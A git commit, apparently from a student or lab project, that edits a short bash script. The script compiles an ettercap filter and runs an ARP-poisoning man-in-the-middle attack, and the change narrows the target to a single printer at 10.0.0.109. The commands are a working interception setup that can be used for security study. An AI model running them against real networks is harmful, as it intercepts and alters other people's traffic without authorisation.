9c2d1be09ebb72dbb6ff10a62b2a2b17a720b41d
Veronica Herzog <vherzog@bu.edu>
2017-12-03 14:05:05 -0500

    changed script to specify printer IP

--- ettercap_filter.sh
+++ ettercap_filter.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 sudo etterfilter ip.filter -o ip.ef
-sudo ettercap -Tq -F ip.ef -M arp:remote // //
+sudo ettercap -Tq -F ip.ef -M arp:remote /10.0.0.109/ //
 echo "Log files are located in /tmp directory"
